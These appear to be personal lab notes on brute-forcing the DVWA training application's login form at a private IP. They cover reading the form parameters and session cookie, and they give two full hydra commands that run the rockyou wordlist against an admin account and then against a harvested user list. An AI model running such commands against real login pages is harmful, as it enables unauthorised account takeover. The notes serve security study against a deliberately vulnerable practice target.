# Presented with a classic username/password web form
- using hydra
- hydra needs options
  - wordlist_file
  - [service]
    - by inspecting sourcecode we see alot of get so its probebaly a http-get-form
  - target_URI
    - The full target URL.
    - Any parameters
    - Failed login message.
    - first two can be found using burp by intercipting the request
    - last req can be found by typing wrong password or user to the web page
  - give a way for Hydra to authenticate to our target page
    - Cookies
    - examining the cookies our browser has by Firefox developer web console (Control+Shift+K)
    - entering the string document.cookie
    - two fields, security and PHPSESSID. security is our current security setting, "low". PHPSESSID is our session ID, which is actually what we need
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.206.128 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: security=low; PHPSESSID=9cd4a8a97889ff80bb8ac41154a0a16d:incorrect" -V 
```
# Other Accounts
- after we logged in there is and image we inspect it and we see a directory
- **http://192.168.206.128/dvwa/hackable/users/admin.jpg**
- we go to the users and we see alist of valid users
- put the users in alist and run hydra again with the list made and we got all thier passwors
```
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.206.128 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: security=low; PHPSESSID=9cd4a8a97889ff80bb8ac41154a0a16d:incorrect"
```
